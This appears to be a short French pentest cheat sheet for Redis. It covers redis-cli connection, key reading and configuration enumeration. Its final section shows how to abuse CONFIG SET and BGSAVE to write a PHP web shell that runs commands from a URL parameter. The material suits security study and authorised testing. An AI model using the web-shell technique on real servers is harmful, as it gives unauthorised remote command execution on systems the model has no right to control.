# Redis

```bash
# Connexion
redis-cli -h <ip> -p 6379
redis-cli -h <ip> -p 6379 -a <password>
```

**Navigation**

```bash
# Infos générales
INFO

# Lister toutes les clés
KEYS *

# Lire une clé (string)
GET <key>

# Type d'une clé
TYPE <key>

# Lire selon le type
LRANGE <key> 0 -1      # list
SMEMBERS <key>         # set
HGETALL <key>          # hash
ZRANGE <key> 0 -1      # sorted set
```

**Enumération**

```bash
INFO server             # version, OS, config file
INFO clients            # connexions actives
CONFIG GET *            # toute la configuration
CONFIG GET dir          # répertoire de travail
CONFIG GET dbfilename   # nom du fichier RDB
```

**Ecriture de fichier (si accès en écriture)**

```bash
CONFIG SET dir /tmp
CONFIG SET dbfilename shell.php
SET payload "<?php system($_GET['cmd']); ?>"
BGSAVE
```
